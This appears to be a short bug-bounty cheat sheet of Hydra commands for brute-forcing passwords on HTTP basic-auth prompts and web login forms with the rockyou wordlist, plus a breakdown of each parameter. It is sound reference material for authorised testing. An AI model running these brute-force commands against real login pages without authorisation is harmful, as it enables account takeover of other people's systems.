# 🕷️ 03. Web Application & Bug Bounty Commands

## 1. HTTP-GET (Basic Authentication)
**Command:**
`hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-get /admin_path -vV -f`
*   **Best Use Case:** Attacking browser pop-up login boxes (Routers, Tomcat managers). 

## 2. HTTP-POST-FORM (Web Login Pages)
**Command:**
`hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_DOMAIN> http-post-form "/login_path:username=^USER^&password=^PASS^&Login=submit:F=<FAILURE_MESSAGE>" -vV -f`
*   **In-depth Breakdown:**
    *   `/login_path`: Example `/login.php` or `/api/v1/auth`.
    *   `username=^USER^&password=^PASS^`: Request body captured from Burp Suite. Hydra injects the payload where `^USER^` and `^PASS^` are placed.
    *   `F=<FAILURE_MESSAGE>`: The text that appears on screen when a login fails (e.g., `F=Invalid credentials`).
*   **Best Use Case:** Standard web login pages. Much faster than Burp Intruder Community Edition.
*
